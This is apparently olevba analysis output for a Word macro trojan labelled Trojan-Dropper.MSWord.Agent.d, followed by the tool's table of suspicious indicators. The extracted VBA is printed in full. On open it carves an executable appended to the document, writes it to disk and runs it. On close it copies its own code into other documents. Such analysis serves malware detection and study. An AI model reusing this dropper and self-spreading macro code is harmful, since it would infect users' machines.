olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan-Dropper.MSWord.Agent.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan-Dropper.MSWord.Agent.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()

    Dim buffer(65536) As Byte
    Dim h, h2, j, i, k As Long
    h = 2
    MsgBox (h)
    
    h = CreateFile(ThisDocument.Path & "\" & ThisDocument.Name, _
                    GENERIC_READ, _
                    FILE_SHARE_READ + FILE_SHARE_WRITE, _
                    0, _
                    OPEN_EXISTING, _
                    0, _
                    0 _
                   )
    '以SHARE_READ的方式打开自身的DOC文件
    MsgBox (ThisDocument.Path & "\" & ThisDocument.Name)
    MsgBox (h)
    
    h2 = CreateFile("d:\vba\ok.exe", _
                     GENERIC_WRITE, _
                     0, _
                     0, _
                     CREATE_ALWAYS, _
                     0, _
                     0 _
                    )
    '新建一个EXE文件准备存放读取出来的数据.
    MsgBox (h2)
    
    If h = INVALID_HANDLE_VALUE Then
        Exit Sub
    End If

    k = SetFilePointer(h, 342016, nil, 0) '把文件指针移动到DOC文件与EXE文件交界处.
    MsgBox (k)
    
    Do
        i = ReadFile(h, buffer(0), 65536, j, 0)
        i = WriteFile(h2, buffer(0), j, j, 0)
    Loop Until j < 65536

    CloseHandle (h)
    CloseHandle (h2)

    Shell "d:\vab\ok.exe" '运行EXE文件

End Sub


Sub Document_close()
Dim m, a, i As Byte
Dim Str As Long

Set m = MacroContainer.VBProject.VBComponents.Item(1).CodeModule
Set a = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
For i = 1 To m.CountOfLines
Str = m.Lines(i, 1)
If Str = "Sub Document_close()" Then Exit For
Next
j = 1
Label_01:
a.InsertLines j, Str
If Str = "End Sub" Then GoTo Label_02
j = j + 1
i = i + 1
Str = m.Lines(i, 1)
GoTo Label_01
Label_02:
End Sub
-------------------------------------------------------------------------------
VBA MACRO 模块.bas 
in file: Trojan-Dropper.MSWord.Agent.d - OLE stream: 'Macros/VBA/模块'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, ByVal lpSecurityAttributes As Long, ByVal dwCreationDistribution As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplate As Long) As Long
Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Declare Function ReadFile Lib "kernel32" (ByVal hFile As Long, lpBuffer As Byte, ByVal dwNumberOfBytesToRead As Long, lpNumberOfBytesRead As Long, ByVal lpOverlapped As Long) As Long
Declare Function WriteFile Lib "kernel32" (ByVal hFile As Long, lpBuffer As Byte, ByVal dwNumberOfBytesToWrite As Long, lpNumberOfBytesWritten As Long, ByVal lpOverlapped As Long) As Long
Declare Function SetFilePointer Lib "kernel32" (ByVal hFile As Long, ByVal lDistanceToMove As Long, ByVal lpDistanceToMoveHigh As Long, ByVal dwMoveMethod As Long) As Long

Public Const GENERIC_READ As Long = &H80000000
Public Const GENERIC_WRITE As Long = &H40000000
Public Const FILE_SHARE_READ As Long = 1
Public Const FILE_SHARE_WRITE As Long = 2
Public Const CREATE_NEW As Long = 1
Public Const CREATE_ALWAYS As Long = 2
Public Const OPEN_EXISTING As Long = 3
Public Const OPEN_ALWAYS As Long = 4
Public Const TRUNCATE_EXISTING As Long = 5
Public Const INVALID_HANDLE_VALUE As Long = -1
Public Const FILE_ATTRIBUTE_NORMAL As Long = &H80
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ok.exe              |Executable file name                         |
+----------+--------------------+---------------------------------------------+

